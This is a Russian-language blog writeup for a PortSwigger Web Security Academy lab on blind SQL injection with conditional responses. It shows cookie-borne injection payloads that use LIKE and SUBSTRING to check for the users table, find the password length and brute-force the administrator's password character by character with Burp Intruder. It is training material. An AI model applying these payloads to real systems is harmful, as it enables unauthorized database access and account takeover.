---
title: "Blind SQL injection with conditional responses"
date: 2025-06-13
tags: [web, writeup]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/learning-paths/sql-injection/sql-injection-exploiting-blind-sql-injection-by-triggering-conditional-responses/sql-injection/blind/lab-conditional-responses"
classes: wide
---

В данной лабе есть уязвимый к **Blind based SQL injection**. В БД есть таблицы с именам `users` и колонками `username` и `password`. Нужно получить информацию из БД, чтобы зайти в аккаунт `administrator`.


```
https://0aba006f03d52a0d821060e700e9006a.web-security-academy.net
```

## Solution

В данной лабе есть подсказка, что уязвимость находится в `Cookies`. Поэтому посмотрю на содержимое `HTTP`-запроса:

```http
GET /filter?category=Gifts HTTP/2
Host: 0aba006f03d52a0d821060e700e9006a.web-security-academy.net
Cookie: TrackingId=Z28gj5Ik5MfywkER; session=WVhVuqALey9XO6wavivtQPu00cE5waLo
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aba006f03d52a0d821060e700e9006a.web-security-academy.net/filter?category=Corporate+gifts
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

В `Cookie` есть два значения: `TrackingId` и `session`. Попробую подставить значение в `TrackingId`. Отправлю оригинальный запрос, чтобы было с чем сравнивать:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5396

...

```

Вижу, что размер ответа `5396`, а на странице отображается данное сообщение:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_responses/1.png){: height="200" .align-center}


Отправлю запрос с  пейлоадом `and 1=0--`, чтобы значение выражения было всегда `False` значением поля `TrackingId`:

```http
GET /filter?category=Gifts HTTP/2
Host: 0aba006f03d52a0d821060e700e9006a.web-security-academy.net
Cookie: TrackingId=Z28gj5Ik5MfywkER' and 1=0--; session=WVhVuqALey9XO6wavivtQPu00cE5waLo
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:135.0) Gecko/20100101 Firefox/135.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0aba006f03d52a0d821060e700e9006a.web-security-academy.net/filter?category=Corporate+gifts
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=0, i
Te: trailers
```

Я получил следующий ответ:

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 5335
...
```


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_responses/2.png){: height="200" .align-center}


Надписи нет, а значит при верном значении `TrackingId` у нас появляется надпись. Это может служить индикатором того, что пейлоад сработал.

Попробую подобрать сам пейлоад. Значение этого параметра — текст. Поэтому предположу, что запрос может выглядеть следующим образом:

```sql
SELECT * FROM table WHERE TrackinId = 'value' AND session = 'session'
```

Из условия мне известно название таблицы, попробую это проверить:

```
Z28gj5Ik5MfywkER' and (SELECT '1' from users LIMIT 1) = '1'-- -' - Ok
```

Значит в БД есть такая таблица. Теперь нужно написать запрос для проверки существования пользователя `administrotor`:

```
Z28gj5Ik5MfywkER' and (SELECT username FROM users WHERE username='administrator') = 'administrator'-- -Ok'
```

Такой пользователь есть, теперь дело за малым — достать из БД пароль. Для начала попробуй найти длину пароля. Для этого буду использовать оператор `LIKE` и символ `_`, который обозначает один любой символ. Таким образом пейлоад может выглядеть следующим образом:

```
Z28gj5Ik5MfywkER' and (SELECT username FROM users WHERE username='administrator' AND password LIKE '_') = 'administrator'-- -'
Z28gj5Ik5MfywkER' and (SELECT username FROM users WHERE username='administrator' AND password LIKE '__') = 'administrator'-- -'
Z28gj5Ik5MfywkER' and (SELECT username FROM users WHERE username='administrator' AND password LIKE '___') = 'administrator'-- -'
Z28gj5Ik5MfywkER' and (SELECT username FROM users WHERE username='administrator' AND password LIKE '____') = 'administrator'-- -'
Z28gj5Ik5MfywkER' and (SELECT username FROM users WHERE username='administrator' AND password LIKE '_____') = 'administrator'-- -'

...

Z28gj5Ik5MfywkER' and (SELECT username FROM users WHERE username='administrator' AND password LIKE '____________________') = 'administrator'-- -'
```

Я ~~ебал~~ удивлен такому паролю. Начал брутфорсить длину вместо бинарного поиска. О чем пожалел...


Итак, длина 20 символов. Теперь нужно подобрать сам пароль. Для этого я буду использовать оператор `SUBSTRING`. С его помощью для каждой позиции пароля я буду доставать один символ и сравнивать его с каждым из набора печатных символов. В случае, когда символ окажется верным, я получу на странице сообщение `Welcome back`. Пейлоад будет следующий:

```
Z28gj5Ik5MfywkER' and (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='administrator') = 'a'-- -'
```

Можно это перебрать вручную, но это отнимет кучу времени, поэтому я использую `Intruder` в `Burp Suite`:  

1. Отправлю нужный запрос в `Intruder`:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_responses/3.png){: height="200" .align-center}


2. Отмечу место для подстановки символов с помощью символов `$`:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_responses/4.png){: height="200" .align-center}


3. На вкладке `Payloads` выберу тип пейлоада `Brute Force`, а длину выставлю на `1`, так как сравнивается всегда только один символ:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_responses/5.png){: height="200" .align-center}


4. Начать атаку!!  

5. Отсортирую по размеру ответа:


![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_responses/6.png){: height="200" .align-center}


Я получил первую букву пароля — `v`. Теперь это нужно сделать для всех остальных...

3 DAYS LATER... я получил пароль: `vt48kuprn49cw067cmq4`. Попробую зайти в аккаунт:



![IMG](/assets/images/IMG_writeups/IMG_PortSwigger/IMG_sqli/IMG_Blind_SQL_injection_with_conditional_responses/7.png){: height="200" .align-center}


Успех... ☕
